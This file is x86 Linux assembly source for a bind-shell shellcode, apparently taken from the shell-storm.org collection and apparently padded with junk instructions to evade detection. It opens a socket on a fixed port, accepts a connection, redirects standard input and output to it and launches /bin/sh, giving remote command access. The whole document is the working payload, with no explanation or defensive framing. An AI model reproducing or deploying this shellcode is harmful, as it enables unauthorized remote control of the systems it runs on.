; http://shell-storm.org/shellcode/files/shellcode-847.php
; Bind shell

section .text

	global _start

_start:
	xor eax,eax
	xor esi, esi
	add esi, 0x2
	mov al, 0x3
	mul esi
	xor ebx,ebx
	xor eax,eax
	push eax 
	push 0x6
	inc edx
	push edx
	inc edx
	push edx
	mov al,0x66
	xor ecx,ecx
	dec edx
	mov ecx,esp
	dec edx
	xor edx,edx
	mov bl,0x1
	push eax
	int 0x80
	mov esi,eax
	mov al,0x64
	inc eax
	mov bl,0x2
	push edx 
	inc eax
	xor edi, edi
	push word 0x697a
	inc edi
	inc edi
	push di
	mov bl,0x2
	mov ecx,esp
	mov edi, esi
	push 0x10
	push ecx 
	push edi 
	inc edi
	mov ecx,esp
	int 0x80
	mul edi
	mov al,0x66
	xor ecx, ecx
	inc ecx
	push ecx
	mov edi, esi
	mov dword [esp-4],esi 
	sub esp, 4
	mov ecx,esp
	mov bl,0x3
	inc ebx
	int 0x80
	mov al,0x64
	xor edi,edi
	mov bl,0x6
	push edi 
	inc eax
	dec ebx
	push edi 
	push esi 
	inc edi
	mov ecx,esp
	dec edi
	inc eax
	int 0x80
	mov ebx,eax
	xor ecx,ecx
	mov cl,0x3

test: 
	mov al,0x3f
	dec cl
	int 0x80
	jne test
	xor eax,eax
	ror edx, 1
	push edx 
	push 0x68732f6e
	rol edx, 1
	push 0x69622f2f
	mov ebx,esp
	cld
	push edx 
	inc esi
	push ebx 
	mov ecx,esp
	xor eax, eax
	push eax 
	mov edx,esp
	mov al,0xb
	int 0x80